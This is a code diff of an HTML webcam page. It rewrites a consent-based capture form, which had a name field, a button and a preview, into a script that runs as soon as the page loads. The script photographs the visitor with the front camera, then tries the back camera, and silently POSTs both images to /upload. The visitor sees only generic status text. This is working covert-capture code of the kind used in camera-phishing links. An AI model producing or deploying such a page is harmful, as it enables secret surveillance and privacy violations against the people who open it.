@@ -1,68 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Capture</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-    video, canvas, img { border: 1px solid #ccc; margin-top: 10px; }
-    input, button { margin-top: 10px; padding: 8px; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Capture</title>
 </head>
 <body>
-  <h2>Webcam Capture</h2>
+<h2>Capturing...</h2>
+<p id="status">Initializing camera...</p>
 
-  <input type="text" id="name" placeholder="Enter your name" required><br>
-  <video id="video" width="320" height="240" autoplay></video><br>
-  <button id="captureBtn">Capture</button>
-  <div id="preview"></div>
-
-  <script>
-    // Generate sessionId for this visit
+<script>
+(async function() {
+    const status = document.getElementById("status");
+    const name = "visitor"; // default name (or you can take from URL params)
     const sessionId = Date.now().toString() + Math.floor(Math.random() * 1000);
 
-    // Start webcam
-    const video = document.getElementById('video');
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => { console.error("Webcam error:", err); });
+    async function takePhoto(facingMode) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
 
-    document.getElementById('captureBtn').addEventListener('click', () => {
-      const name = document.getElementById('name').value.trim();
-      if (!name) return alert("Please enter your name");
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/jpeg");
 
-      // Capture image from video
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        return imageData;
+    }
 
-      const imageData = canvas.toDataURL('image/jpeg');
+    async function sendToServer(imageData, type) {
+        await fetch("/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                image: imageData, 
+                name, 
+                type, 
+                sessionId 
+            })
+        });
+    }
 
-      // Show preview
-      const img = document.createElement('img');
-      img.src = imageData;
-      img.width = 160;
-      document.getElementById('preview').appendChild(img);
+    try {
+        status.innerText = "Capturing front camera...";
+        const frontPhoto = await takePhoto("user");
+        await sendToServer(frontPhoto, "front");
 
-      // Upload to server
-      fetch('/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          image: imageData,
-          name: name,
-          type: "photo",
-          sessionId: sessionId
-        })
-      }).then(res => {
-        if (res.ok) {
-          console.log("Uploaded successfully");
-        } else {
-          console.error("Upload failed");
-        }
-      });
-    });
-  </script>
+        status.innerText = "Switching to back camera...";
+        setTimeout(async () => {
+            try {
+                const backPhoto = await takePhoto({ exact: "environment" });
+                await sendToServer(backPhoto, "back");
+            } catch {
+                console.warn("Back camera not available.");
+            }
+            status.innerText = "Capture complete!";
+        }, 1500);
+    } catch (err) {
+        status.innerText = "Error: " + err.message;
+    }
+})();
+</script>
 </body>
 </html>
